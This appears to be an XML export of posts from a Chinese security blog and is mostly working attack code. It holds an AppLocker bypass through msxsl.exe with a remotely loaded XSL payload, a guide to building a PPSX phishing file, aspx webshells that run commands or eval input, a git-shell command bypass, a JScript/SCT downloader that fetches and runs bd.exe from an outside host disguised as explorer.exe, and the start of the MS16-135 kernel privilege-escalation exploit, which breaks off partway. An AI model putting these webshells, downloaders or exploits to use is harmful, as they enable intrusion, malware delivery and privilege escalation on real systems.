    <content type="text"><![CDATA[12345678910111213141516171819202122$ie = New-Object -Com internetExplorer.Application$ie.Navigate("https://site.com/somefile")#------------------------------#Wait for Download Dialog box to pop upSleep 5while($ie.Busy)&#123;Sleep 1&#125;#------------------------------#Hit "S" on the keyboard to hit the "Save" button on the download box$obj = new-object -com WScript.Shell$obj.AppActivate('Internet Explorer')$obj.SendKeys('s')#Hit "Enter" to save the file$obj.SendKeys('&#123;Enter&#125;')#Closes IE Downloads window$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;TAB&#125;')$obj.SendKeys('&#123;Enter&#125;') 原文：戳我]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bypass AppLocker With MSXSL.EXE]]></title>
    <url>%2Farchives%2FAppLocker_Bypass_MSXSL.html</url>
    <content type="text"><![CDATA[关于XSLT之前已经有几篇文章进行介绍了，Hack With XSLT，XXE with XSL，Xsl Exec Webshell ，今天分享一个通过MSXSL.exe绕过Applocker的方法。msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。下载地址为：戳我 msxsl.exe 需要接受两个文件，XML及XSL文件，命令行操作如下：1msxsl.exe demo.xml exec.xsl demo.xml1234567&lt;?xml version="1.0"?&gt;&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;&lt;customers&gt;&lt;customer&gt;&lt;name&gt;Microsoft&lt;/name&gt;&lt;/customer&gt;&lt;/customers&gt; exec.xsl1234567891011121314151617&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt; function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); return nodelist.nextNode().xml; &#125;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="user:xml(.)"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 同样的，msxsl.exe可以远程加载，具体方式如下：1msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[构造PPSX钓鱼文件]]></title>
    <url>%2Farchives%2FCreate_PPSX.html</url>
    <content type="text"><![CDATA[之前出现了一种新型的钓鱼攻击的手法，即通过PPT在未开启宏的情况下，执行程序，关于这个Freebuf也有相关文章进行介绍，《新型PPT钓鱼攻击分析》，《无需宏，PPT也能用来投递恶意程序》。但是文中都未介绍怎么制作这种文件，所以，今天在这里分享一下制作该文件的方法，希望大家了解并对此进行防御。 首先，创建一个普通的PPTX文件，随便填入一些内容，如下图： 之后插入一个动作按钮，具体位置如下图： 这里要选择空白的那个，选择以后，在页面中拉出一个触发位置，之后会弹出动作设置的界面： 选择鼠标移过-&gt;运行程序： 选择要运行的程序可在后面直接加参数，如计算器，之后点击确定。现在显示为一个有色区域，所以要对他进行设置，右键-&gt;设置形状格式，将填充和线条颜色改成无 最后将文件保存为PPSX文件即可。 最终效果：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xsl Exec Webshell (aspx)]]></title>
    <url>%2Farchives%2FXsl_Exec_Webshell.html</url>
    <content type="text"><![CDATA[关于使用xsl的webshell以前已经有人发过了，比如aspx的一个webshell如下：12345678910111213141516171819202122232425262728&lt;%@ Page Language="C#" Debug="true" %&gt;&lt;%@ import Namespace="System.IO"%&gt;&lt;%@ import Namespace="System.Xml"%&gt;&lt;%@ import Namespace="System.Xml.Xsl"%&gt;&lt;%string xml=@"&lt;?xml version=""1.0""?&gt;&lt;root&gt;test&lt;/root&gt;";string xslt=@"&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""&gt; &lt;msxsl:script language=""JScript"" implements-prefix=""zcg""&gt; &lt;msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;![CDATA[function xml() &#123;var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item['a'],'unsafe');Response.End();&#125;]]&gt; &lt;/msxsl:script&gt;&lt;xsl:template match=""/root""&gt; &lt;xsl:value-of select=""zcg:xml()""/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;";XmlDocument xmldoc=new XmlDocument();xmldoc.LoadXml(xml);XmlDocument xsldoc=new XmlDocument();xsldoc.LoadXml(xslt);XslCompiledTransform xct=new XslCompiledTransform();xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());xct.Transform(xmldoc,null,new MemoryStream());%&gt; 密码为 a，这个webshell是可以用菜刀连接的，测试碰到这种情况：服务器有安全狗等防护软件，提交的各种数据包可能会拦截，而现在想要做的就是执行命令就可以了，为了方便，写了一个命令执行的webshell，可回显，可改密码，具体代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@page language="C#"%&gt;&lt;%@ import Namespace="System.IO"%&gt;&lt;%@ import Namespace="System.Xml"%&gt;&lt;%@ import Namespace="System.Xml.Xsl"%&gt;&lt;%string xml=@"&lt;?xml version=""1.0""?&gt;&lt;root&gt;test&lt;/root&gt;";string xslt=@"&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""&gt; &lt;msxsl:script language=""JScript"" implements-prefix=""zcg""&gt; &lt;msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/&gt; &lt;msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt; &lt;![CDATA[function xml()&#123; var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response; var command = Request.Item['cmd']; var r = new ActiveXObject(""WScript.Shell"").Exec(""cmd /c ""+command); var OutStream = r.StdOut; var Str = """"; while (!OutStream.atEndOfStream) &#123; Str = Str + OutStream.readAll(); &#125; Response.Write(""&lt;pre&gt;""+Str+""&lt;/pre&gt;""); &#125;]]&gt; &lt;/msxsl:script&gt;&lt;xsl:template match=""/root""&gt; &lt;xsl:value-of select=""zcg:xml()""/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;";XmlDocument xmldoc=new XmlDocument();xmldoc.LoadXml(xml);XmlDocument xsldoc=new XmlDocument();xsldoc.LoadXml(xslt);XsltSettings xslt_settings = new XsltSettings(false, true);xslt_settings.EnableScript = true;try&#123; XslCompiledTransform xct=new XslCompiledTransform(); xct.Load(xsldoc,xslt_settings,new XmlUrlResolver()); xct.Transform(xmldoc,null,new MemoryStream());&#125;catch (Exception e)&#123; Response.Write("Error");&#125;%&gt; 密码为cmd，可自己改，测试如下图： 附带一个大马里面的命令执行：12345678910111213141516171819202122232425262728293031323334353637&lt;%@ Page Language="VB" Debug="true" %&gt;&lt;%@ import Namespace="system.IO" %&gt;&lt;%@ import Namespace="System.Diagnostics" %&gt;&lt;script runat="server"&gt; Sub RunCmd(Src As Object, E As EventArgs) Dim myProcess As New Process() Dim myProcessStartInfo As New ProcessStartInfo(xpath.text) myProcessStartInfo.UseShellExecute = false myProcessStartInfo.RedirectStandardOutput = true myProcess.StartInfo = myProcessStartInfo myProcessStartInfo.Arguments=xcmd.text myProcess.Start() Dim myStreamReader As StreamReader = myProcess.StandardOutput Dim myString As String = myStreamReader.Readtoend() myProcess.Close() mystring=replace(mystring,"&lt;","&amp;lt;") mystring=replace(mystring,"&gt;","&amp;gt;") result.text= vbcrlf &amp; "&lt;pre&gt;" &amp; mystring &amp; "&lt;/pre&gt;" End Sub&lt;/script&gt;&lt;html&gt;&lt;body&gt; &lt;form runat="server"&gt; &lt;p&gt;&lt;asp:Label id="L_p" runat="server" width="80px"&gt;Program&lt;/asp:Label&gt; &lt;asp:TextBox id="xpath" runat="server" Width="300px"&gt;c:\windows\system32\cmd.exe&lt;/asp:TextBox&gt; &lt;p&gt;&lt;asp:Label id="L_a" runat="server" width="80px"&gt;Arguments&lt;/asp:Label&gt; &lt;asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user"&gt;/c net user&lt;/asp:TextBox&gt; &lt;p&gt;&lt;asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"&gt;&lt;/asp:Button&gt; &lt;p&gt;&lt;asp:Label id="result" runat="server"&gt;&lt;/asp:Label&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; Pentest]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git Shell Bypass]]></title>
    <url>%2Farchives%2FCVE_2017_8386.html</url>
    <content type="text"><![CDATA[通过git读文件：12git-receive-pack '--help' #本地ssh git@remoteserver "git-receive-pack '--help'" #远程服务器 打开以后按shift+e，然后输入要读的文件路径 通过git执行命令：12git-receive-pack '--help' #本地ssh git@remoteserver "git-receive-pack '--help'" #远程服务器 输入！后输入要执行的命令： 详情：戳我]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JS下载者]]></title>
    <url>%2Farchives%2Fjsdownloader.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920var WSHShell = new ActiveXObject("WScript.Shell");path = WSHShell.ExpandEnvironmentStrings("%temp%");var filepath = path+"/explorer.exe";var xhr = new ActiveXObject("MSXML2.XMLHTTP");xhr.open("GET","http://x.x.x.x/bd.exe", false);xhr.send();if (xhr.Status == 200) &#123; var fso = new ActiveXObject("Scripting.FileSystemObject"); var stream = new ActiveXObject("ADODB.Stream"); stream.Open(); stream.Type = 1; stream.Write(xhr.ResponseBody); stream.Position = 0; if (fso.FileExists(filepath))&#123; fso.DeleteFile(filepath); &#125; stream.SaveToFile(filepath); stream.Close(); new ActiveXObject("WScript.Shell").Exec(filepath);&#125; SCT:12345678910111213141516171819202122232425262728293031323334&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var WSHShell = new ActiveXObject("WScript.Shell"); path = WSHShell.ExpandEnvironmentStrings("%temp%"); var filepath = path+"/explorer.exe"; var xhr = new ActiveXObject("MSXML2.XMLHTTP"); xhr.open("GET","http://x.x.x.x/bd.exe", false); xhr.send(); if (xhr.Status == 200) &#123; var fso = new ActiveXObject("Scripting.FileSystemObject"); var stream = new ActiveXObject("ADODB.Stream"); stream.Open(); stream.Type = 1; stream.Write(xhr.ResponseBody); stream.Position = 0; if (fso.FileExists(filepath))&#123; fso.DeleteFile(filepath); &#125; stream.SaveToFile(filepath); stream.Close(); new ActiveXObject("WScript.Shell").Exec(filepath); &#125; ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MS16-135 带参数版]]></title>
    <url>%2Farchives%2FInvoke-MS16-135.html</url>
    <content type="text"><![CDATA[修改了一个带参数版的，方便用，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880function Invoke-MS16-135 &#123;&lt;#.SYNOPSIS PowerShell implementation of MS16-135. The exploit targets all vulnerable operating systems that support PowerShell v2+. * Win7-Win10 &lt;== 64 bit!.PARAMETER ApplicationSpecifies an Application to run..PARAMETER CommandlineSpecifies Commandline, such as net user xxx xxx /add .EXAMPLE C:\PS&gt; Invoke-MS16-135 -Application C:\Windows\System32\cmd.exe C:\PS&gt; Invoke-MS16-135 -Application C:\Windows\System32\cmd.exe -Commandline "/c net user 1 1 /add"#&gt;[CmdletBinding()]param( [Parameter(Mandatory = $False, ParameterSetName = 'C:\Windows\System32\cmd.exe' )] [string] $Application, [Parameter(Mandatory = $False)] [string] $Commandline)Add-Type -TypeDefinition @"using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;[StructLayout(LayoutKind.Sequential)]public struct INPUT&#123; public int itype; public KEYBDINPUT U; public int Size;&#125;[StructLayout(LayoutKind.Sequential)]public struct KEYBDINPUT&#123; public UInt16 wVk; public UInt16 wScan; public uint dwFlags; public int time; public IntPtr dwExtraInfo;&#125;[StructLayout(LayoutKind.Sequential)] public struct tagMSG &#123; public IntPtr hwnd; public UInt32 message; public UIntPtr wParam; public UIntPtr lParam; public UInt32 time; public POINT pt;&#125;public struct POINT&#123; public Int32 x; public Int32 Y;&#125;public class ms16135&#123; delegate IntPtr WndProc( IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam); [System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)] struct WNDCLASSEX &#123; public uint cbSize; public uint style; public IntPtr lpfnWndProc; public int cbClsExtra; public int cbWndExtra; public IntPtr hInstance; public IntPtr hIcon; public IntPtr hCursor; public IntPtr hbrBackground; [MarshalAs(UnmanagedType.LPWStr)] public string lpszMenuName; [MarshalAs(UnmanagedType.LPWStr)] public string lpszClassName; public IntPtr hIconSm; &#125; [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] static extern System.UInt16 RegisterClassW( [System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] public static extern IntPtr CreateWindowExW( UInt32 dwExStyle, [MarshalAs(UnmanagedType.LPWStr)] string lpClassName, [MarshalAs(UnmanagedType.LPWStr)] string lpWindowName, UInt32 dwStyle, Int32 x, Int32 y, Int32 nWidth, Int32 nHeight, IntPtr hWndParent, IntPtr hMenu, IntPtr hInstance, IntPtr lpParam); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] static extern System.IntPtr DefWindowProcW( IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam); [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] public static extern bool DestroyWindow( IntPtr hWnd); [DllImport("user32.dll", SetLastError = true)] public static extern bool UnregisterClass( String lpClassName, IntPtr hInstance); [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetModuleHandleW( [MarshalAs(UnmanagedType.LPWStr)] String lpModuleName); [DllImport("user32.dll", EntryPoint="SetWindowLongPtr")] public static extern IntPtr SetWindowLongPtr( IntPtr hWnd, int nIndex, IntPtr dwNewLong); [DllImport("user32.dll")] public static extern bool ShowWindow( IntPtr hWnd, int nCmdShow); [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetParent( IntPtr hWndChild, IntPtr hWndNewParent); [DllImport("user32.dll", SetLastError = false)] public static extern IntPtr GetDesktopWindow(); [DllImport("user32.dll")] public static extern bool SetForegroundWindow( IntPtr hWnd); [DllImport("user32.dll", SetLastError=true)] public static extern void SwitchToThisWindow( IntPtr hWnd, bool fAltTab); [DllImport("user32.dll")] public static extern bool GetMessage( out tagMSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax); [DllImport("user32.dll")] public static extern bool TranslateMessage( [In] ref tagMSG lpMsg); [DllImport("user32.dll")] public static extern IntPtr DispatchMessage( [In] ref tagMSG lpmsg); [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetFocus( IntPtr hWnd); [DllImport("user32.dll")] public static extern uint SendInput( uint nInputs, [In] INPUT pInputs, int cbSize); [DllImport("gdi32.dll")] public static extern int GetBitmapBits( IntPtr hbmp, int cbBuffer, IntPtr lpvBits); [DllImport("gdi32.dll")] public static extern int SetBitmapBits( IntPtr hbmp, int cbBytes, IntPtr lpBits); [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAlloc( IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect); public UInt16 CustomClass(string class_name) &#123; m_wnd_proc_delegate = CustomWndProc; WNDCLASSEX wind_class = new WNDCLASSEX(); wind_class.lpszClassName = class_name; ///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class); wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate); return RegisterClassW(ref wind_class); &#125; private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam) &#123; return DefWindowProcW(hWnd, msg, wParam, lParam); &#125; private WndProc m_wnd_proc_delegate;&#125;"@#==============================================================[Banner] $ms16135 = @" _____ _____ ___ ___ ___ ___ ___ | | __|_ | | _|___|_ | |_ | _| | | | |__ |_| |_| . |___|_| |_|_ |_ | |_|_|_|_____|_____|___| |_____|___|___| [by b33f -&gt; @FuzzySec] "@$ms16135#==============================================================[Pre-Run]# Exploit is only for x64if ([System.IntPtr]::Size -ne 8) &#123; echo "`n[!] Target architecture is x64 only!`n" Return&#125;# Get OS version$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"switch ($OSMajorMinor)&#123; '10.0' # Win10 / 2k16 &#123; echo "[?] Target is Win 10" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.3' # Win8.1 / 2k12R2 &#123; echo "[?] Target is Win 8.1" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.2' # Win8 / 2k12 &#123; echo "[?] Target is Win 8" echo "[+] Bitmap dimensions: 0x760*0x4`n" &#125; '6.1' # Win7 / 2k8R2 &#123; echo "[?] Target is Win 7" echo "[+] Bitmap dimensions: 0x770*0x4`n" &#125;&#125;#==============================================================[Helpers]function Get-LoadedModules &#123;&lt;#.SYNOPSIS Use NtQuerySystemInformation::SystemModuleInformation to get a list of loaded modules, their base address and size (x32/x64). Note: Low integrity only pre 8.1.DESCRIPTION Author: Ruben Boonen (@FuzzySec) License: BSD 3-Clause Required Dependencies: None Optional Dependencies: None.EXAMPLE C:\PS&gt; $Modules = Get-LoadedModules C:\PS&gt; $KernelBase = $Modules[0].ImageBase C:\PS&gt; $KernelType = ($Modules[0].ImageName -split "\\")[-1] C:\PS&gt; ......#&gt; Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; [StructLayout(LayoutKind.Sequential, Pack = 1)] public struct SYSTEM_MODULE_INFORMATION &#123; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)] public UIntPtr[] Reserved; public IntPtr ImageBase; public UInt32 ImageSize; public UInt32 Flags; public UInt16 LoadOrderIndex; public UInt16 InitOrderIndex; public UInt16 LoadCount; public UInt16 ModuleNameOffset; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)] internal Char[] _ImageName; public String ImageName &#123; get &#123; return new String(_ImageName).Split(new Char[] &#123;'\0'&#125;, 2)[0]; &#125; &#125; &#125; public static class Ntdll &#123; [DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation( int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int ReturnLength); &#125;"@ [int]$BuffPtr_Size = 0 while ($true) &#123; [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size) $SystemInformationLength = New-Object Int # SystemModuleInformation Class = 11 $CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength) # STATUS_INFO_LENGTH_MISMATCH if ($CallResult -eq 0xC0000004) &#123; [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr) [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength) &#125; # STATUS_SUCCESS elseif ($CallResult -eq 0x00000000) &#123; break &#125; # Probably: 0xC0000005 -&gt; STATUS_ACCESS_VIOLATION else &#123; [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr) return &#125; &#125; $SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION $SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType() if ([System.IntPtr]::Size -eq 4) &#123; $SYSTEM_MODULE_INFORMATION_Size = 284 &#125; else &#123; $SYSTEM_MODULE_INFORMATION_Size = 296 &#125; $BuffOffset = $BuffPtr.ToInt64() $HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) $BuffOffset = $BuffOffset + [System.IntPtr]::Size $SystemModuleArray = @() for ($i=0; $i -lt $HandleCount; $i++)&#123; $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION) $HashTable = @&#123; ImageName = $Cast.ImageName ImageBase = if ([System.IntPtr]::Size -eq 4) &#123;$($Cast.ImageBase).ToInt32()&#125; else &#123;$($Cast.ImageBase).ToInt64()&#125; ImageSize = "0x$('&#123;0:X&#125;' -f $Cast.ImageSize)" &#125; $Object = New-Object PSObject -Property $HashTable $SystemModuleArray += $Object $BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size &#125; $SystemModuleArray # Free SystemModuleInformation array [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)&#125;function Stage-gSharedInfoBitmap &#123;&lt;#.SYNOPSIS Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (post anniversary)..DESCRIPTION Author: Ruben Boonen (@FuzzySec) License: BSD 3-Clause Required Dependencies: None Optional Dependencies: None.EXAMPLE PS C:\Users\b33f&gt; Stage-gSharedInfoBitmap |fl BitmapKernelObj : -7692235059200 BitmappvScan0 : -7692235059120 BitmapHandle : 1845828432 PS C:\Users\b33f&gt; $Manager = Stage-gSharedInfoBitmap PS C:\Users\b33f&gt; "&#123;0:X&#125;" -f $Manager.BitmapKernelObj FFFFF901030FF000#&gt; Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; public static class gSharedInfoBitmap &#123; [DllImport("gdi32.dll")] public static extern IntPtr CreateBitmap( int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits); [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibrary( string lpFileName); [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress( IntPtr hModule, string procName); [DllImport("user32.dll")] public static extern IntPtr CreateAcceleratorTable( IntPtr lpaccl, int cEntries); [DllImport("user32.dll")] public static extern bool DestroyAcceleratorTable( IntPtr hAccel); &#125;"@ # Check Arch if ([System.IntPtr]::Size -eq 4) &#123; $x32 = 1 &#125; function Create-AcceleratorTable &#123; [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000) $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll") $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo") if ($x32)&#123; $gSharedInfo = $gSharedInfo.ToInt32() &#125; else &#123; $gSharedInfo = $gSharedInfo.ToInt64() &#125; $aheList = $gSharedInfo + [System.IntPtr]::Size if ($x32)&#123; $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList) $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry) &#125; else &#123; $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList) $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18 $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry) &#125; $Result = @() $HashTable = @&#123; Handle = $AccelHandle KernelObj = $phead &#125; $Object = New-Object PSObject -Property $HashTable $Result += $Object $Result &#125; function Destroy-AcceleratorTable &#123; param ($Hanlde) $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde) &#125; $KernelArray = @() for ($i=0;$i -lt 20;$i++) &#123; $KernelArray += Create-AcceleratorTable if ($KernelArray.Length -gt 1) &#123; if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) &#123; Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4) if ($OSMajorMinor -eq "6.1") &#123; $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) # Win7 &#125; else &#123; $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) # Win8-10 &#125; break &#125; &#125; Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle &#125; $BitMapObject = @() $HashTable = @&#123; BitmapHandle = $BitmapHandle BitmapKernelObj = $($KernelArray[$i].KernelObj) BitmappvScan0 = if ($x32) &#123;$($KernelArray[$i].KernelObj) + 0x32&#125; else &#123;$($KernelArray[$i].KernelObj) + 0x50&#125; &#125; $Object = New-Object PSObject -Property $HashTable $BitMapObject += $Object $BitMapObject&#125;function Bitmap-Elevate &#123; param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap) Add-Type -TypeDefinition @" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; public static class BitmapElevate &#123; [DllImport("gdi32.dll")] public static extern int SetBitmapBits( IntPtr hbmp, uint cBytes, byte[] lpBits); [DllImport("gdi32.dll")] public static extern int GetBitmapBits( IntPtr hbmp, int cbBuffer, IntPtr lpvBits); [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAlloc( IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualFree( IntPtr lpAddress, uint dwSize, uint dwFreeType); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool FreeLibrary( IntPtr hModule); [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibrary( string lpFileName); [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress( IntPtr hModule, string procName); &#125;"@ # Arbitrary Kernel read function Bitmap-Read &#123; param ($Address) $CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address)) [IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40) $CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer) if ($x32Architecture)&#123; [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer) &#125; else 